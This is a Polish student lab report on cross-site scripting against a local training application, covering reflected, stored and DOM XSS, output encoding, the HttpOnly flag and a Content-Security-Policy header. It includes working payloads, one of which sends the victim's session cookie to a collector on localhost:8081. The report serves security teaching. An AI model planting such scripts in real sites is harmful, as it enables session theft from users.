# Raport - Laboratorium 6 (Cross-Site Scripting)

## Zadanie 1 - XSS odbity

Adres z ładunkiem: `http://127.0.0.1:8080/szukaj?q=%3Cscript%3Edocument.body.style.background%3D%27red%27%3Bdocument.title%3D%27XSS-odbity%27%3C%2Fscript%3E`
Numer wiersza z błędem: wiersz 35 w pliku `aplikacja/app.py`
Fragment HTML przed poprawką: `<h1>Wyniki wyszukiwania dla: <script>document.body.style.background='red';document.title='XSS-odbity'</script></h1>`
Fragment HTML po poprawce: `<h1>Wyniki wyszukiwania dla: &lt;script&gt;document.body.style.background=&#x27;red&#x27;;document.title=&#x27;XSS-odbity&#x27;&lt;/script&gt;</h1>`
Wniosek: Kodowanie wyjścia (html.escape) zamienia znaki specjalne HTML (m.in. <, >, ') na zwykły tekst, natomiast filtrowanie samego słowa script można łatwo obejść innymi znacznikami i atrybutami zdarzeń

## Zadanie 2 - XSS zapisany i przejęcie sesji

Treść ładunku: `<script>new Image().src='http://localhost:8081/?c='+encodeURIComponent(document.cookie)</script>`
Wpis zbieracza przed zmianą: `ZEBRANO: /?c=session=eyJ1enl0a293bmlr...`
Wpis zbieracza po zmianie: `ZEBRANO: /?c=`
Wynik kroku 3: Zwrócono prywatną notatkę użytkownika `anna`: "Prywatna notatka Anny: kod do szafki w pracowni 4721 (fikcyjny)."
Nagłówek `Set-Cookie` przed zmianą: `Set-Cookie: session=eyJ1enl0a293bmlr...; Path=/`
Nagłówek `Set-Cookie` po zmianie: `Set-Cookie: session=eyJ1enl0a293bmlr...; HttpOnly; Path=/`
Wniosek: Flaga HttpOnly blokuje jedynie odczyt ciasteczka z poziomu JavaScriptu (document.cookie), ale nie usuwa samej luki XSS - wstrzyknięty skrypt nadal może zmieniać treść strony albo wysyłać żądania w imieniu zalogowanego użytkownika

## Zadanie 3 - Naprawa i Content Security Policy

| Typ ataku | Miejsce testu | Wynik przed naprawą | Wynik po naprawie |
|---|---|---|---|
| XSS odbity | `/szukaj?q=...` | Zmiana tła na czerwone i tytułu na `XSS-odbity` | Wyświetla się jako zwykły tekst |
| XSS zapisany | Tablica ogłoszeń (`/`) | Wysłanie ciasteczka sesji do zbieracza | Wyświetla się jako zwykły tekst |
| XSS DOM | `/podglad#...` | Zmiana tytułu karty na `XSS-DOM` przez `onerror` | Wyświetla się jako zwykły tekst |

Nagłówek CSP z odpowiedzi: `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'`
Wynik testu tekstu: Ogłoszenie `Zażółć gęślą jaźń: <b>pogrubienie</b> & "cudzysłów" 'apostrof'` wyświetla się dosłownie jako zwykły tekst (bez pogrubienia), a strona `/podglad` poprawnie wyświetla tekst wpisany po znaku `#`.
Wniosek: Nagłówek CSP jest tylko dodatkową warstwą ochrony ograniczającą skutki ataku (blokuje m.in. skrypty inline), ale nie zastępuje kodowania wyjścia, bo bez niego atakujący wciąż może wstrzykiwać zwykłe znaczniki HTML i modyfikować wygląd strony